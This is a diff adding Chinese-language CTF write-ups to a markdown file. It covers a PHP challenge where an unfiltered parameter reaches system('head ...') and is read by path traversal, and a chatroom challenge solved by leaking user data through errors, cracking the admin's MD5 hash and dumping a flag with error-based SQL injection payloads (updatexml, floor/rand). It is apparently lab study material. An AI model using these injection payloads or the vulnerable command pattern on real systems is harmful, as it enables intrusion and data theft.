@@ -239,3 +239,165 @@ while True:
 
 后来在google中也找到了原题的wp，非常详细的解答
 [【原创】Pwnhub会员日一题引发的思考](https://xz.aliyun.com/t/1520/?utm_source=tuicool&utm_medium=referral#toc-2)
+
+
+<br>
+# 刀塔
+无论你喜欢打Dota还是LOL，都进网站里学习一下吧！
+
+题目有两种解法，扫目录的时候发现`www.zip`文件，直接能拿源码
+另一种是预期解，后来从源码分析中也得知到了
+
+进入页面没有什么特别的信息
+![daota1](2018-06-26-16-56-03.png)
+
+有`flag.php`文件，点击进入也没有什么信息
+![daota2](2018-06-26-17-05-09.png)
+
+接下来思路也比较明确，利用某些漏洞信息去读取`flag.php`文件内容，一般只有命令执行或者任意文件读取这样的漏洞
+但是页面只给了两个几个参数点，大概试了下SQL注入，发现无效，所以猜测他显示文章的业务逻辑是如何的
+
+猜测是否是伪静态页面或者参数信息为文件路径，简单测试果然出现了信息，那么说明思路没错，`pid`测试下来应该是被强转为数字类型了
+![daota3](2018-06-26-19-53-55.png)
+
+`nid`中发现出现了`lllegal operation!`的过滤信息
+
+![daota4](2018-06-26-20-08-35.png)
+
+各种尝试下，发现长度只有5，并且不能出现英文，可以出现标点符号和数字
+建立在这种前提下，基本就能确定，是用linux命令去读取文件，例如`cat`，那么我们可以构建读取上层目录所有文件
+![daota5](2018-06-26-20-14-59.png)
+发现还会带有文件名，然后一堆乱码，开始还以为内容无法读取，然后linux系统里面试了下，右键源代码，发现了文件内容
+
+![daota6](2018-06-26-20-16-16.png)
+
+在最开始我是用御剑就扫到源码，后来发现过滤规则也的确如此
+```
+if(isset($_GET['nid'])){
+
+    if(preg_match("/[a-zA-Z]/",$_GET['nid'])){
+        exit("Illegal operation!");
+    }elseif(strlen($_GET[nid])>5){
+        exit("Illegal operation!");
+    }else{
+        echo "<p class=lead>";
+        system("head ./news/" . $_GET['nid']);
+        echo "</p>";
+    }
+
+}else{
+    echo "<h3><a href=index.php?act=news&nid=1>鱼人守卫</a></h3>";
+    echo "<h3><a href=index.php?act=news&nid=2>黑暗游侠</a></h3>";
+    echo "<h3><a href=index.php?act=news&nid=3>血魔</a></h3>";
+
+}
+```
+
+<br>
+# 未上线的聊天室
+
+进入题目就是一个简单的聊天室，但是需要注册登录才能留言，所以先注册一波
+
+![liaotianshi1](2018-07-03-09-52-53.png)
+
+整个站点的功能并不多，所以从留言功能上来看
+
+每次注册成功后，留言上面会显示注册的用户名，但是只显示6位，并且后3位用*号来代替了
+对于XSS也有做转义
+
+![liaotianshi2](2018-07-03-11-03-54.png)
+
+在尝试留言的时候，发现发送过快会有报错信息
+
+![liaotianshi3](2018-07-03-11-05-18.png)
+
+发现里面有自己账户的信息`isadmin=0`，还有一些关于代码的报错信息
+
+----------------------------
+
+然后就在想，既然能利用报错回显自己的信息，那能否利用报错报出其他有用的信息，于是在各个点，各种尝试无果，思路就停止在这
+
+后来在网上看见WriteUp，是通过注册相同用户名，导致username主键相同产生报错(想不懂...)
+
+![liaotianshi4](2018-07-04-10-38-41.png)
+
+可以看见插入的语句，往下翻能看见所有账户数据
+
+![liaotianshi5](2018-07-04-10-40-10.png)
+
+发现了管理员的账户和MD5加密后的密码，直接用[SOMD5](https://somd5.com/)得到密码，直接管理员登录
+
+管理员登录之后，发现管理员多出了一个删除功能
+
+![liaotianshi6](2018-07-04-11-06-35.png)
+
+
+抓了删除功能的请求包，发现是在后端做删除确认，利用`id=24-1`发现是数字型注入
+
+由于是delete注入类型，直接尝试报错注入`id=24||%20updatexml(1,concat(1,database(),0x7e),1)`，发现可行
+
+![liaotianshi7](2018-07-04-11-18-32.png)
+
+但是利用`Xpath`报错如果带上`select`会出现问题
+`id=24||%20updatexml(1,concat(1,(select%20database()),0x7e),1)`
+
+![liaotianshi8](2018-07-04-11-21-23.png)
+
+所有换一种报错姿势
+```
+// 表名 z_flag_986746633
+id=24||(select%201%20from%20(select%20count(*),concat((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)
+// 列名 id,flag
+id=24||(select%201%20from%20(select%20count(*),concat((select%20column_name%20from%20information_schema.columns%20where%20table_name='z_flag_986746633'%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)
+// 数据
+id=24||(select%201%20from%20(select%20count(*),concat((select%20mid(flag,1,100)%20from%20z_flag_986746633%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)
+```
+
+
+<br>
+## 问题
+
+### 报错信息
+ - 这是什么报错信息
+ - 为什么会显示的那么完整
+ - 为什么需要达到主键长度才能导致报错
+
+### 利用Xpath报错注入问题
+利用`Xpath`报错如果带上`select`会出现问题
+`id=24||%20updatexml(1,concat(1,(select%20database()),0x7e),1)`
+![liaotianshi8](2018-07-04-11-21-23.png)
+
+### floor报错注入问题
+
+#### 问题1
+```
+// 使用group_concat()获取所有的数据内容，在该环境下，会直接报错
+// 直接在MYSQL中运行程序会直接执行，不会出现任何报错信息
+id=24||(select%201%20from%20(select%20count(*),concat((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name='z_flag_986746633'%20),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)
+```
+![liaotianshi9](2018-07-04-14-54-32.png)
+
+#### 问题2
+```
+// 如果列名不用mid等函数去包裹，同样会报错
+id=24||(select%201%20from%20(select%20count(*),concat((select%20flag%20from%20z_flag_986746633%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)
+```
+![liaotianshi9](2018-07-04-14-54-32.png)
+
+
+
+以上两个问题报错的信息是一致的，但是又和现象不符合
+
+
+
+
+
+
+
+
+
+
+
+
+
+
